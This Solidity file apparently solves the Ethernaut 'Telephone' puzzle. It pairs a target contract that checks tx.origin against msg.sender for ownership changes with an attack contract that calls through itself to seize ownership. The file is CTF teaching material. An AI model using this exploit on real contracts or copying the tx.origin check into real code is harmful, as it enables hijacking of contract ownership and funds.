// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract TelephoneAttack {
    Telephone _targetContract;

    constructor(address _targetAddress) public {
        _targetContract = Telephone(_targetAddress);
    }

    function attack() external {
        _targetContract.changeOwner(msg.sender);
    }
}
